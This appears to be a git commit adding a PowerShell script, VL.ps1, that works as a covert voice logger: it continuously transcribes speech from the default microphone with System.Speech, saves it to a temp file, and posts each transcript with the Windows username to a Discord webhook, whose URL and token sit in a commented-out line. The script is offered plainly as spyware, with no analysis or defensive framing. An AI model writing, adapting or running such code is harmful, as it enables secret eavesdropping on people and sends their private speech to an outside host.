01cdd233e5b4d927750f545ba14f58494d08bc44
Guimaxime <134263162+Guimaxime@users.noreply.github.com>
2024-05-08 14:21:06 +0200

    Add files via upload

---
+++ VL.ps1
@@ -0,0 +1,49 @@
+function DC-Upload {
+
+	[CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$False)]
+		[string]$text 
+	)
+
+	# $dc = 'https://discord.com/api/webhooks/1237740504435789926/zuL0d5RfYJ3yLVpKoFUMcxzLbIlTLPBYHqipjaiBN8OdfMJOYQj7uQK5bDP6reUez3BV'
+
+	$Body = @{
+	  'username' = $env:username
+	  'content' = $text
+	}
+
+	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
+}
+
+
+
+function voiceLogger {
+
+    Add-Type -AssemblyName System.Speech
+    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+    $grammar = New-Object System.Speech.Recognition.DictationGrammar
+    $recognizer.LoadGrammar($grammar)
+    $recognizer.SetInputToDefaultAudioDevice()
+
+    while ($true) {
+        $result = $recognizer.Recognize()
+        if ($result) {
+            $results = $result.Text
+            Write-Output $results
+            $log = "$env:tmp/VoiceLog.txt"
+            echo $results > $log
+            $text = get-content $log -raw
+            DC-Upload $text
+
+            # Use a switch statement with the $results variable
+            switch -regex ($results) {
+                '\bnote\b' {saps notepad}
+                '\bexit\b' {break}
+            }
+        }
+    }
+    Clear-Content -Path $log
+}
+
+voiceLogger
